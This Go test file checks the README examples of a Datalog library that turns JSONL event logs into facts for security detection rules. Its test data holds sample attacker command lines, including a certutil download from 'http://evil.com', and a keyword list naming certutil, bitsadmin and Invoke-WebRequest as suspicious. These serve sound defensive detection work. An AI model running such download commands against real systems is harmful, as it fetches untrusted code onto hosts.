package datalog_test

// Tests in this file verify the code patterns documented in README.md.
// If a test here breaks, update both the code and the README.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"slices"
	"sort"
	"testing"
	"testing/fstest"

	"swdunlop.dev/pkg/datalog"
	"swdunlop.dev/pkg/datalog/jsonfacts"
	"swdunlop.dev/pkg/datalog/memory"
	"swdunlop.dev/pkg/datalog/seminaive"
	"swdunlop.dev/pkg/datalog/syntax"
)

// TestReadmeSimpleMapping verifies the "Sources and Simple Mappings" example:
// simple predicate/args/filter extraction from JSONL.
func TestReadmeSimpleMapping(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "processes.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "process",
						"args":      []string{"value.pid", "value.name", "value.cmdline"},
						"filter":    "value.pid != 0",
					},
				},
			},
		},
	})

	dataFS := fstest.MapFS{
		"processes.jsonl": {Data: []byte(
			`{"pid": 1234, "name": "cmd.exe", "cmdline": "cmd /c whoami"}` + "\n" +
				`{"pid": 0, "name": "idle", "cmdline": ""}` + "\n" +
				`{"pid": 5678, "name": "notepad.exe", "cmdline": "notepad readme.txt"}` + "\n",
		)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	// Filter should exclude pid=0.
	count := 0
	for range db.Facts("process", 3) {
		count++
	}
	if count != 2 {
		t.Errorf("expected 2 process facts (pid=0 filtered), got %d", count)
	}
}

// TestReadmeImperativeMapping verifies the "Imperative Mappings" example:
// fresh_id() and assert() for one-to-many decomposition.
func TestReadmeImperativeMapping(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "emails.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id(); assert("email", [id, value.sender, value.time]); map(value.recipients, assert("email_to", [id, #]))`,
					},
				},
			},
		},
	})

	dataFS := fstest.MapFS{
		"emails.jsonl": {Data: []byte(
			`{"sender": "alice", "time": "2024-01-01", "recipients": ["bob", "carol"]}` + "\n",
		)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	emailCount := 0
	for range db.Facts("email", 3) {
		emailCount++
	}
	if emailCount != 1 {
		t.Errorf("expected 1 email fact, got %d", emailCount)
	}

	recipientCount := 0
	for range db.Facts("email_to", 2) {
		recipientCount++
	}
	if recipientCount != 2 {
		t.Errorf("expected 2 email_to facts, got %d", recipientCount)
	}

	// Verify ID linkage: email and email_to share ID #0.
	for row := range db.Query("email", datalog.ID(0), datalog.Variable("S"), datalog.Variable("T")) {
		if string(row[1].(datalog.String)) != "alice" {
			t.Errorf("expected sender alice, got %s", row[1])
		}
	}
}

// TestReadmeRules verifies the "Writing Datalog Rules" examples:
// transitive closure, negation, constraints, arithmetic, and aggregates.
func TestReadmeRules(t *testing.T) {
	b := memory.NewBuilder()
	for _, f := range []datalog.Fact{
		{Name: "spawned", Terms: []datalog.Constant{datalog.String("init"), datalog.String("sshd")}},
		{Name: "spawned", Terms: []datalog.Constant{datalog.String("sshd"), datalog.String("bash")}},
		{Name: "spawned", Terms: []datalog.Constant{datalog.String("bash"), datalog.String("python")}},
	} {
		b.AddFact(f)
	}
	db := b.Build()

	t.Run("transitive_closure", func(t *testing.T) {
		// From README: child_process + descendant rules.
		tr, err := syntax.Parse(seminaive.New(), `
			child_process(Parent, Child) :- spawned(Parent, Child).
			descendant(P, C) :- child_process(P, C).
			descendant(P, C) :- child_process(P, M), descendant(M, C).
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), db)
		if err != nil {
			t.Fatal(err)
		}

		// init should be ancestor of python (init->sshd->bash->python).
		found := false
		for row := range output.Query("descendant", datalog.String("init"), datalog.Variable("C")) {
			if string(row[1].(datalog.String)) == "python" {
				found = true
			}
		}
		if !found {
			t.Error("expected descendant(init, python)")
		}
	})

	t.Run("negation", func(t *testing.T) {
		// From README: unexpected(Pid, Cmd) :- process(Pid, Cmd), not allowlisted(Cmd).
		tr, err := syntax.Parse(seminaive.New(), `
			allowlisted("svchost.exe").
			process("p1", "cmd.exe").
			process("p2", "svchost.exe").
			unexpected(Pid, Cmd) :- process(Pid, Cmd), not allowlisted(Cmd).
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), datalog.Empty{})
		if err != nil {
			t.Fatal(err)
		}

		count := 0
		for row := range output.Facts("unexpected", 2) {
			if string(row[1].(datalog.String)) != "cmd.exe" {
				t.Errorf("unexpected should only match cmd.exe, got %s", row[1])
			}
			count++
		}
		if count != 1 {
			t.Errorf("expected 1 unexpected fact, got %d", count)
		}
	})

	t.Run("constraints", func(t *testing.T) {
		// From README: large_transfer(From, To, Amt) :- transfer(From, To, Amt), Amt > 10000.
		tr, err := syntax.Parse(seminaive.New(), `
			transfer("alice", "bob", 5000).
			transfer("carol", "dave", 50000).
			transfer("eve", "frank", 10001).
			large_transfer(From, To, Amt) :- transfer(From, To, Amt), Amt > 10000.
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), datalog.Empty{})
		if err != nil {
			t.Fatal(err)
		}

		count := 0
		for range output.Facts("large_transfer", 3) {
			count++
		}
		if count != 2 {
			t.Errorf("expected 2 large_transfer facts, got %d", count)
		}
	})

	t.Run("arithmetic", func(t *testing.T) {
		// From README: cost(Item, Total) :- price(Item, P), tax_rate(Rate), Total is P * (1 + Rate).
		tr, err := syntax.Parse(seminaive.New(), `
			price("widget", 100).
			tax_rate(0.1).
			cost(Item, Total) :- price(Item, P), tax_rate(Rate), Total is P * (1 + Rate).
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), datalog.Empty{})
		if err != nil {
			t.Fatal(err)
		}

		found := false
		for row := range output.Facts("cost", 2) {
			total := row[1]
			// 100 * (1 + 0.1) = 110.0 (float because tax_rate is float)
			switch v := total.(type) {
			case datalog.Integer:
				if int64(v) != 110 {
					t.Errorf("expected cost 110, got %d", v)
				}
				found = true
			case datalog.Float:
				if float64(v) < 109.99 || float64(v) > 110.01 {
					t.Errorf("expected cost ~110, got %f", v)
				}
				found = true
			default:
				t.Errorf("unexpected type %T for cost", total)
			}
		}
		if !found {
			t.Error("expected a cost fact")
		}
	})

	t.Run("aggregates", func(t *testing.T) {
		// From README: alert_count(Sev, N) :- N = count : alert(?, Sev, ?).
		tr, err := syntax.Parse(seminaive.New(), `
			alert("a1", "high", "2024-01-01").
			alert("a2", "high", "2024-01-02").
			alert("a3", "low", "2024-01-03").
			alert_count(Sev, N) :- N = count : alert(?, Sev, ?).
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), datalog.Empty{})
		if err != nil {
			t.Fatal(err)
		}

		counts := map[string]int64{}
		for row := range output.Facts("alert_count", 2) {
			sev := string(row[0].(datalog.String))
			n := int64(row[1].(datalog.Integer))
			counts[sev] = n
		}
		if counts["high"] != 2 {
			t.Errorf("expected high=2, got %d", counts["high"])
		}
		if counts["low"] != 1 {
			t.Errorf("expected low=1, got %d", counts["low"])
		}
	})

	t.Run("string_builtins", func(t *testing.T) {
		// From README: matched(Str) :- data(Str), @contains(Str, "password").
		tr, err := syntax.Parse(seminaive.New(), `
			data("my_password_file").
			data("readme.txt").
			data("password123").
			matched(Str) :- data(Str), @contains(Str, "password").
		`)
		if err != nil {
			t.Fatal(err)
		}
		output, err := tr.Transform(context.Background(), datalog.Empty{})
		if err != nil {
			t.Fatal(err)
		}

		var matched []string
		for row := range output.Facts("matched", 1) {
			matched = append(matched, string(row[0].(datalog.String)))
		}
		sort.Strings(matched)
		expected := []string{"my_password_file", "password123"}
		if !slices.Equal(matched, expected) {
			t.Errorf("expected %v, got %v", expected, matched)
		}
	})
}

// TestReadmeMatchers verifies the "Schema Configuration Reference" matcher example:
// contains matcher with case_insensitive and windash.
func TestReadmeMatchers(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "process",
						"args":      []string{"value.pid", "value.name", "value.cmdline"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":        "process",
				"term":             2,
				"case_insensitive": true,
				"windash":          true,
				"contains":         []string{"certutil", "bitsadmin", "Invoke-WebRequest"},
			},
		},
	})

	dataFS := fstest.MapFS{
		"procs.jsonl": {Data: []byte(
			`{"pid":1,"name":"cmd.exe","cmdline":"CERTUTIL /urlcache"}` + "\n" +
				`{"pid":2,"name":"notepad.exe","cmdline":"notepad readme.txt"}` + "\n" +
				`{"pid":3,"name":"cmd.exe","cmdline":"bitsadmin -transfer job"}` + "\n",
		)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	// With case_insensitive + windash, predicate is ci_wd_contains.
	matchCount := 0
	for range db.Facts("ci_wd_contains", 2) {
		matchCount++
	}
	if matchCount < 2 {
		t.Errorf("expected at least 2 ci_wd_contains facts, got %d", matchCount)
	}
}

// TestReadmeEncoder verifies the "JSONL Encoder" example:
// encoding facts with declarations produces named JSON fields.
func TestReadmeEncoder(t *testing.T) {
	decls := []datalog.Declaration{
		{
			Name: "suspicious",
			Use:  "Processes matching known-bad patterns.",
			Terms: []datalog.TermDeclaration{
				{Name: "host"},
				{Name: "pid"},
				{Name: "cmdline"},
			},
		},
	}

	var buf bytes.Buffer
	enc := jsonfacts.NewEncoder(&buf, decls)
	if err := enc.Encode("suspicious", []datalog.Constant{
		datalog.String("ws01"),
		datalog.Integer(1234),
		datalog.String("certutil -urlcache"),
	}); err != nil {
		t.Fatal(err)
	}

	var obj map[string]map[string]any
	if err := json.Unmarshal(buf.Bytes(), &obj); err != nil {
		t.Fatal(err)
	}

	sus, ok := obj["suspicious"]
	if !ok {
		t.Fatal("expected 'suspicious' key in output")
	}
	if sus["host"] != "ws01" {
		t.Errorf("expected host=ws01, got %v", sus["host"])
	}
	if sus["pid"] != float64(1234) {
		t.Errorf("expected pid=1234, got %v", sus["pid"])
	}
	if sus["cmdline"] != "certutil -urlcache" {
		t.Errorf("expected cmdline, got %v", sus["cmdline"])
	}
}

// TestReadmeProcessMonitoring verifies the "Process Execution Monitoring" security example:
// full pipeline from JSONL through matchers, rules, and query.
func TestReadmeProcessMonitoring(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "process_events.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "process",
						"args":      []string{"value.hostname", "value.pid", "value.parent_pid", "value.cmdline"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate":        "process",
				"term":             3,
				"case_insensitive": true,
				"windash":          true,
				"contains":         []string{"certutil", "bitsadmin"},
			},
		},
	})

	dataFS := fstest.MapFS{
		"process_events.jsonl": {Data: []byte(
			`{"hostname":"ws01","pid":"100","parent_pid":"1","cmdline":"explorer.exe"}` + "\n" +
				`{"hostname":"ws01","pid":"200","parent_pid":"100","cmdline":"cmd.exe"}` + "\n" +
				`{"hostname":"ws01","pid":"300","parent_pid":"200","cmdline":"certutil -urlcache -split -f http://evil.com"}` + "\n" +
				`{"hostname":"ws01","pid":"400","parent_pid":"1","cmdline":"notepad.exe"}` + "\n",
		)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	// Apply the rules from the README process monitoring example.
	tr, err := syntax.Parse(seminaive.New(), `
		parent(Host, Parent, Child) :- process(Host, Child, Parent, _).
		ancestor(Host, Anc, Desc) :- parent(Host, Anc, Desc).
		ancestor(Host, Anc, Desc) :- parent(Host, Anc, Mid), ancestor(Host, Mid, Desc).
		suspicious(Host, Pid, Cmd) :-
			process(Host, Pid, _, Cmd),
			ci_wd_contains(Cmd, ?).
	`)
	if err != nil {
		t.Fatal(err)
	}

	output, err := tr.Transform(context.Background(), db)
	if err != nil {
		t.Fatal(err)
	}

	// Verify: pid 300 (certutil) should be suspicious.
	susCount := 0
	for row := range output.Facts("suspicious", 3) {
		pid := string(row[1].(datalog.String))
		if pid != "300" {
			t.Errorf("expected suspicious pid=300, got %s", pid)
		}
		susCount++
	}
	if susCount != 1 {
		t.Errorf("expected 1 suspicious fact, got %d", susCount)
	}

	// Verify: ancestor(ws01, 100, 300) should exist (explorer -> cmd -> certutil).
	found := false
	for range output.Query("ancestor",
		datalog.String("ws01"),
		datalog.String("100"),
		datalog.String("300"),
	) {
		found = true
	}
	if !found {
		t.Error("expected ancestor(ws01, 100, 300)")
	}
}

// TestReadmeQueryPatterns verifies the "Querying Results" code patterns:
// Database.Facts iteration and Database.Query with typed constants.
func TestReadmeQueryPatterns(t *testing.T) {
	b := memory.NewBuilder()
	b.AddFact(datalog.Fact{Name: "suspicious", Terms: []datalog.Constant{
		datalog.Integer(1234), datalog.String("certutil -urlcache"),
	}})
	b.AddFact(datalog.Fact{Name: "suspicious", Terms: []datalog.Constant{
		datalog.Integer(5678), datalog.String("bitsadmin /transfer"),
	}})
	db := b.Build()

	// README pattern: iterate all facts.
	var pids []int64
	for row := range db.Facts("suspicious", 2) {
		pid := row[0].(datalog.Integer)
		_ = row[1].(datalog.String) // cmd
		pids = append(pids, int64(pid))
	}
	if len(pids) != 2 {
		t.Errorf("expected 2 facts, got %d", len(pids))
	}

	// README pattern: query with a constant PID.
	found := false
	for row := range db.Query("suspicious",
		datalog.Integer(1234),
		datalog.Variable("Cmd"),
	) {
		cmd := string(row[1].(datalog.String))
		if cmd != "certutil -urlcache" {
			t.Errorf("expected certutil command, got %s", cmd)
		}
		found = true
	}
	if !found {
		t.Error("expected query to match pid 1234")
	}
}

// TestReadmeFullPipeline exercises the Quick Start example end-to-end
// (minus file I/O, using fstest.MapFS).
func TestReadmeFullPipeline(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "procs.jsonl",
				"mappings": []any{
					map[string]any{
						"predicate": "process",
						"args":      []string{"value.pid", "value.cmd"},
					},
				},
			},
		},
		"matchers": []any{
			map[string]any{
				"predicate": "process",
				"term":      1,
				"contains":  []string{"certutil", "bitsadmin"},
			},
		},
		"declarations": []any{
			map[string]any{
				"name":  "suspicious",
				"terms": []any{map[string]any{"name": "pid"}, map[string]any{"name": "cmd"}},
			},
		},
	})

	dataFS := fstest.MapFS{
		"procs.jsonl": {Data: []byte(
			`{"pid":1,"cmd":"certutil -urlcache"}` + "\n" +
				`{"pid":2,"cmd":"notepad.exe"}` + "\n" +
				`{"pid":3,"cmd":"bitsadmin /transfer"}` + "\n",
		)},
	}

	// 1. Load facts.
	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	// 2. Parse and compile rules.
	tr, err := syntax.Parse(seminaive.New(), `
		allowlisted("notepad.exe").
		suspicious(Pid, Cmd) :-
			process(Pid, Cmd),
			contains(Cmd, _),
			not allowlisted(Cmd).
	`)
	if err != nil {
		t.Fatal(err)
	}

	// 3. Transform.
	output, err := tr.Transform(context.Background(), db)
	if err != nil {
		t.Fatal(err)
	}

	// 4. Encode results.
	enc := jsonfacts.NewEncoder(&bytes.Buffer{}, slices.Collect(output.Declarations()))

	var results []string
	for row := range output.Query("suspicious", datalog.Variable("Pid"), datalog.Variable("Cmd")) {
		var buf bytes.Buffer
		enc2 := jsonfacts.NewEncoder(&buf, slices.Collect(output.Declarations()))
		if err := enc2.Encode("suspicious", row); err != nil {
			t.Fatal(err)
		}
		results = append(results, buf.String())
	}
	_ = enc // used above to show the pattern compiles

	if len(results) != 2 {
		t.Errorf("expected 2 suspicious results, got %d", len(results))
	}

	// Verify each result is valid JSON with the expected structure.
	for _, r := range results {
		var obj map[string]map[string]any
		if err := json.Unmarshal([]byte(r), &obj); err != nil {
			t.Fatalf("invalid JSONL output: %v", err)
		}
		sus, ok := obj["suspicious"]
		if !ok {
			t.Fatal("expected 'suspicious' key")
		}
		if _, ok := sus["pid"]; !ok {
			t.Error("expected 'pid' field")
		}
		if _, ok := sus["cmd"]; !ok {
			t.Error("expected 'cmd' field")
		}
	}
}

// TestReadmeEmailAnalysis verifies the "Email Attachment Analysis" security example.
func TestReadmeEmailAnalysis(t *testing.T) {
	schemaJSON, _ := json.Marshal(map[string]any{
		"sources": []any{
			map[string]any{
				"file": "email_events.jsonl",
				"mappings": []any{
					map[string]any{
						"expr": `let id = fresh_id();
assert("email", [id, value.sender, value.subject, value.timestamp]);
map(value.recipients, assert("email_to", [id, #]));
map(value.attachments, (
  let aid = fresh_id();
  assert("attachment", [id, aid, #.filename, #.sha256, #.size])
))`,
					},
				},
			},
		},
	})

	dataFS := fstest.MapFS{
		"email_events.jsonl": {Data: []byte(
			`{"sender":"mallory","subject":"Check this out","timestamp":"2024-01-01","recipients":["alice","bob"],"attachments":[{"filename":"payload.exe","sha256":"abc123","size":4096}]}` + "\n",
		)},
	}

	var cfg jsonfacts.Config
	if err := cfg.LoadSchemaFS(fstest.MapFS{"schema.json": {Data: schemaJSON}}); err != nil {
		t.Fatal(err)
	}
	db, err := cfg.LoadFS(dataFS)
	if err != nil {
		t.Fatal(err)
	}

	// Apply the README rules for email analysis.
	tr, err := syntax.Parse(seminaive.New(), `
		executable_attachment(EmailId, Filename, Hash) :-
			attachment(EmailId, ?, Filename, Hash, ?),
			@ends_with(Filename, ".exe").

		broadcast_executable(Sender, Subject, Filename) :-
			executable_attachment(EmailId, Filename, ?),
			email(EmailId, Sender, Subject, ?),
			email_to(EmailId, R1),
			email_to(EmailId, R2),
			R1 != R2.
	`)
	if err != nil {
		t.Fatal(err)
	}

	output, err := tr.Transform(context.Background(), db)
	if err != nil {
		t.Fatal(err)
	}

	// Should find the executable attachment.
	exeCount := 0
	for row := range output.Facts("executable_attachment", 3) {
		fname := string(row[1].(datalog.String))
		if fname != "payload.exe" {
			t.Errorf("expected payload.exe, got %s", fname)
		}
		exeCount++
	}
	if exeCount != 1 {
		t.Errorf("expected 1 executable_attachment, got %d", exeCount)
	}

	// Should detect broadcast (2 recipients + executable).
	broadcastCount := 0
	for row := range output.Facts("broadcast_executable", 3) {
		sender := string(row[0].(datalog.String))
		if sender != "mallory" {
			t.Errorf("expected sender mallory, got %s", sender)
		}
		broadcastCount++
	}
	if broadcastCount != 1 {
		t.Errorf("expected 1 broadcast_executable, got %d", broadcastCount)
	}
}

func TestDatabaseExtend(t *testing.T) {
	b := memory.NewBuilder()
	b.AddFact(datalog.Fact{Name: "parent", Terms: []datalog.Constant{datalog.String("tom"), datalog.String("bob")}})
	original := b.Build()

	extended := original.Extend(
		datalog.Fact{Name: "parent", Terms: []datalog.Constant{datalog.String("bob"), datalog.String("ann")}},
	)

	// Original should still have 1 fact.
	origCount := 0
	for range original.Facts("parent", 2) {
		origCount++
	}
	if origCount != 1 {
		t.Errorf("original should have 1 fact, got %d", origCount)
	}

	// Extended should have 2 facts.
	extCount := 0
	for range extended.Facts("parent", 2) {
		extCount++
	}
	if extCount != 2 {
		t.Errorf("extended should have 2 facts, got %d", extCount)
	}
}

func TestDatabasePredicates(t *testing.T) {
	b := memory.NewBuilder()
	b.AddFact(datalog.Fact{Name: "parent", Terms: []datalog.Constant{datalog.String("tom"), datalog.String("bob")}})
	b.AddFact(datalog.Fact{Name: "age", Terms: []datalog.Constant{datalog.String("tom"), datalog.Integer(50)}})
	b.AddFact(datalog.Fact{Name: "parent", Terms: []datalog.Constant{datalog.String("bob"), datalog.String("ann")}})
	db := b.Build()

	preds := map[string]int{}
	for name, arity := range db.Predicates() {
		preds[name] = arity
	}

	if preds["parent"] != 2 {
		t.Errorf("expected parent/2, got parent/%d", preds["parent"])
	}
	if preds["age"] != 2 {
		t.Errorf("expected age/2, got age/%d", preds["age"])
	}
	if len(preds) != 2 {
		t.Errorf("expected 2 predicates, got %d", len(preds))
	}
}

func init() {
	// Suppress unused import errors for fmt — used in README examples
	// and available here to match README code patterns.
	_ = fmt.Sprintf
}
